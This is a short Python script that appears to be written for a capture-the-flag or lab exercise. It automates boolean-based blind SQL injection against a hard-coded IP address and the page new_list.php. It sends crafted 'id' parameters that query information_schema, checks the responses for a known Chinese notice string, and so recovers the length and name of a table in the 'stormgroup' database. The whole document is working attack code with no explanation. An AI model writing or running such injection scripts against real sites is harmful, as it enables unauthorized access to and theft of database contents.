# _*_  coding:utf-8 _*_
import requests
import sys


def lentb():
    for i in range(1,20):
        payload = '''?id=1 and (select length(table_name) from information_schema.tables where table_schema='stormgroup' limit 0,1) > %s''' %i
        url = '''http://219.153.49.228:47706/new_list.php'''
        req = requests.get(url+payload+"%23") # %23--url decode is #
        if u"关于平台停机维护的通知" in req.text:
            print(i)
        else:
            print("table_length:",i)
            break

lentb()

def tbname():
    name = ""
    for j in range(1,7): # dabase length == 6
        for k in "zxcvbnmasdfghjklqwertyuiop":
            url = "http://219.153.49.228:47706/new_list.php?id=1  and substr((select table_name from information_schema.tables where table_schema='stormgroup' limit 0,1),%d,1)='%s'" %(j,k)
            req = requests.get(url+"%23")
            if u"关于平台停机维护的通知" in req.text:
                name = name +k
                print(name)
                break #跳出k循环

    print("table_name:", name)

tbname()









